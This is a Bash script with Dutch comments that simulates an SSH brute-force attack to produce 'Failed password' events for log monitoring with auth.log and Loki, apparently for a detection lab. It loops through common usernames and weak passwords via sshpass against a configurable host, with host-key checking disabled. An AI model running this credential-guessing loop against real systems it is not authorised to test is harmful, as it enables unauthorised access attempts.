#!/usr/bin/env bash
# ==============================================================================
# Script: attack_ssh_bruteforce.sh
# Doel: Simuleert een SSH brute-force inbraakpoging door in korte tijd
#       veelvoudige mislukte logins uit te voeren.
# Bewijs: Te zien in /var/log/auth.log en Loki Promtail aggregatie.
# ==============================================================================

TARGET_HOST=${1:-"127.0.0.1"}
TARGET_PORT=${2:-22}
ATTEMPTS=${3:-15}

echo "========================================================"
echo "[!] START SSH BRUTE-FORCE AANVALSSIMULATIE"
echo "[!] Doel: $TARGET_HOST op poort $TARGET_PORT ($ATTEMPTS pogingen)"
echo "========================================================"

USERNAMES=("admin" "root" "test" "oracle" "developer" "ubuntu" "support")
PASSWORDS=("123456" "password" "admin123" "welcome" "toor" "letmein")

for ((i=1; i<=ATTEMPTS; i++)); do
    RANDOM_USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    RANDOM_PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    
    echo "[$i/$ATTEMPTS] Poging tot inloggen met user '$RANDOM_USER'..."
    
    # Gebruik ssh met batchmode of sshpass om direct een mislukte authenticatie in het log te forceren
    if command -v sshpass &>/dev/null; then
        sshpass -p "$RANDOM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p "$TARGET_PORT" "$RANDOM_USER@$TARGET_HOST" exit 2>/dev/null
    else
        # Fallback: direct met ssh opties
        ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p "$TARGET_PORT" "$RANDOM_USER@$TARGET_HOST" exit 2>/dev/null
    fi
    
    # Korte pauze tussen pogingen
    sleep 0.2
done

echo "[✓] Brute-force simulatie afgerond. Controleer /var/log/auth.log of Loki voor 'Failed password' events."
